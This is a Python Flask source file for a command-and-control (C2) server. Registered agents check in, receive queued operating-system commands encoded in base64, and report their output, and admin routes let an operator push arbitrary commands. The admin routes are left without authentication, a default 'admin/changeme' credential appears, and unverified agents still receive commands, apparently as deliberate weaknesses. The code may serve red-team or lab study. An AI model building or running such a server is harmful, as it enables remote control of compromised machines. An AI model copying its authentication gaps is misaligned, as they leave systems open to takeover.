"""
API endpoints for the C2 server
"""
import logging
import time
import base64
from flask import request, jsonify, Response

from core.models import AgentManager, Command
from core.commands import get_commands_for_os
from core.crypto import generate_token, generate_nonce, base64_encode
from config.settings import COOKIE_SECURE, COOKIE_HTTPONLY, COOKIE_SAMESITE
from core.crypto import hash_challenge
from config.settings import SHARED_SECRET

import functools
import os

agent_manager = AgentManager()

def register_routes(app):
    """Register all routes with the Flask app"""
    
    @app.route('/overview', methods=['POST'])
    def check_in():
        """
        Initial check-in endpoint for agents
        Handles mutual authentication with challenge-response
        """
        try:
            data = request.get_json(force=True)
            aid = data.get('aid')
            os_type = data.get('ops')
            client_nonce = data.get('nonce')
            arch = data.get('arch')
            
            if not aid or not os_type or not client_nonce:
                logging.warning("Invalid check-in data")
                return jsonify({"error": "Missing required fields"}), 400
            
            agent = agent_manager.register_agent(aid, os_type, arch)
            
            token = generate_token()
            server_nonce = generate_nonce()
            
            agent.token = token
            agent.client_nonce = client_nonce
            agent.server_nonce = server_nonce
            
            agent_manager.assign_token(aid, token)
            
            if not agent.command_queue:
                commands = get_commands_for_os(os_type)
                for cmd_group in commands:
                    for cmd_data in cmd_group:
                        command = Command(cmd=cmd_data["cmd"], type=cmd_data["type"])
                        agent.command_queue.append(command)
            
            resp = {
                'status': 'Success',
                'timestamp': time.time(),
                'challenge': server_nonce
            }
            
            response = jsonify(resp)
            response.set_cookie(
                'auth_token', 
                token, 
                httponly=COOKIE_HTTPONLY, 
                secure=COOKIE_SECURE, 
                samesite=COOKIE_SAMESITE
            )
            return response, 200
            
        except Exception as e:
            logging.error(f"Error processing agent check-in: {e}")
            return jsonify({"error": "Invalid request format"}), 400
    

    @app.route('/health', methods=['GET'])
    def health_check():
        """Health check endpoint for container orchestration"""
        return jsonify({"status": "healthy", "timestamp": time.time()}), 200


    @app.route('/verify', methods=['POST'])
    def verify():
        """
        Verify the client's response to the server's challenge
        Completes the mutual authentication process
        """
        try:
            data = request.get_json(force=True)
            client_nonce = data.get('client_nonce')
            server_challenge = data.get('server_challenge')
            client_response = data.get('response')
            
            if not client_nonce or not server_challenge:
                return jsonify({"error": "Missing verification parameters"}), 400
            
            token = request.cookies.get('auth_token')
            if not token:
                return jsonify({"error": "Missing auth token"}), 400
                
            agent = agent_manager.get_agent_by_token(token)
            if not agent:
                return jsonify({"error": "Invalid token"}), 400
            
            if agent.client_nonce != client_nonce:
                logging.warning(f"Client nonce mismatch for agent {agent.aid}")
                return jsonify({"error": "Verification failed"}), 400
            
            if agent.server_nonce != server_challenge:
                logging.warning(f"Server challenge mismatch for agent {agent.aid}")
                return jsonify({"error": "Verification failed"}), 400
            
            if client_response:
                ############# replace with secure KMS in future ###################
                shared_secret = SHARED_SECRET
                
                expected_response = hash_challenge(
                    challenge=server_challenge,
                    shared_secret=shared_secret
                )
                
                if client_response != expected_response:
                    logging.warning(f"Invalid challenge response from agent {agent.aid}")
                    agent.verified = False

                    return jsonify({"error": "Invalid challenge response"}), 400
                else:
                    agent.verified = True
            else:
                logging.warning(f"Missing challenge response from agent {agent.aid}")
            
            
            return jsonify({"status": "verified"}), 200
            
        except Exception as e:
            logging.error(f"Error during verification: {e}")
            return jsonify({"error": "Verification failed"}), 400
    
    @app.route('/cmd', methods=['POST'])
    def c2_endpoint():
        """
        Primary C2 endpoint for command distribution
        Requires authentication via secure cookie
        """
        try:
            token = request.cookies.get('auth_token')
            if not token:
                logging.warning('Missing auth cookie')
                return jsonify({"error": "Missing auth token"}), 400
            
            agent = agent_manager.get_agent_by_token(token)
            if not agent:
                logging.warning('Invalid token access attempt')
                return jsonify({"error": "Invalid token"}), 400
            
            agent.last_seen = time.time()
            logging.info(f"Agent aid={agent.aid} checked in at {agent.last_seen:.2f}")
            
            command = agent_manager.get_next_command(agent.aid)
            if command:
                command_text = command.cmd
            else:
                command_text = 'NOP'
            
            encoded_command = base64_encode(command_text)
            
            response = {
                "status": "active",
                "timestamp": time.time(),
                "cmd": encoded_command
            }
            
            logging.info(f"Dispatched command to agent aid={agent.aid}: {command_text}")
            return jsonify(response), 200
            
        except Exception as e:
            logging.error(f"Error processing command request: {e}")
            return jsonify({"error": "Command processing error"}), 400
    
    @app.route('/report', methods=['POST'])
    def report_endpoint():
        """
        Endpoint for agents to report command results
        """
        try:
            token = request.cookies.get('auth_token')
            if not token:
                logging.warning('Missing auth cookie in report endpoint')
                return jsonify({"error": "Missing auth token"}), 400
            
            agent = agent_manager.get_agent_by_token(token)
            if not agent:
                logging.warning('Invalid token in report endpoint')
                return jsonify({"error": "Invalid token"}), 400
            
            data = request.get_json(force=True)
            
            output = base64.b64decode(data.get('output', '')).decode('utf-8')
            error = base64.b64decode(data.get('error', '')).decode('utf-8')
            exit_code = data.get('code')
            
            logging.info(f"Agent {agent.aid} command result: exit_code={exit_code}")
            if output:
                logging.info(f"Command output: {output[:100]}{'...' if len(output) > 100 else ''}")
            if error:
                logging.warning(f"Command error: {error}")
            
            agent.command_history.append({
                'output': output,
                'error': error,
                'code': exit_code,
                'timestamp': time.time()
            })
            
            return jsonify({"status": "success"}), 200
            
        except Exception as e:
            logging.error(f"Error processing command report: {e}")
            return jsonify({"error": "Invalid report format"}), 400
    


# ---------------- ADMIN SECTION ------------------ #

    def admin_required(f):
        @functools.wraps(f)
        def decorated(*args, **kwargs):
            auth = request.authorization
            admin_user = os.environ.get("C2_ADMIN_USER", "admin")
            admin_pass = os.environ.get("C2_ADMIN_PASS", "changeme")
            
            if not auth or auth.username != admin_user or auth.password != admin_pass:
                return Response(
                    'Please authenticate to access the admin panel', 401,
                    {'WWW-Authenticate': 'Basic realm="C2 Admin"'})
            return f(*args, **kwargs)
        return decorated


################# add in auth mechanism to get to admin dashboard ####################
    @app.route('/admin/agents', methods=['GET'])
    def list_agents():
        """Admin endpoint to list all registered agents"""

        ############# Add in authentication to get to admin dashboard ####################
        agents_data = []
        for aid, agent in agent_manager.agents.items():
            agents_data.append({
                'id': aid,
                'os': agent.os_type,
                'arch': agent.arch,
                'first_seen': agent.first_seen,
                'last_seen': agent.last_seen,
                'verified': agent.verified,
                'commands_queued': len(agent.command_queue),
                'commands_executed': len(agent.command_history)
            })
        
        return jsonify({"agents": agents_data}), 200
    
    @app.route('/admin/agent/<aid>/history', methods=['GET'])
    def agent_history(aid):
        """Admin endpoint to view an agent's command history"""
        agent = agent_manager.get_agent(aid)
        if not agent:
            return jsonify({"error": "Agent not found"}), 404
            
        return jsonify({
            "agent": aid,
            "os": agent.os_type,
            "history": agent.command_history
        }), 200
    
    @app.route('/admin/agent/<aid>/queue', methods=['POST'])
    def queue_command(aid):
        """Admin endpoint to add a command to an agent's queue"""
        agent = agent_manager.get_agent(aid)
        if not agent:
            return jsonify({"error": "Agent not found"}), 404
            
        data = request.get_json(force=True)
        cmd = data.get('cmd')
        cmd_type = data.get('type', 'custom')
        
        if not cmd:
            return jsonify({"error": "Missing command"}), 400
            
        command = Command(cmd=cmd, type=cmd_type)
        agent.command_queue.append(command)
        
        return jsonify({
            "status": "success",
            "queue_length": len(agent.command_queue)
        }), 200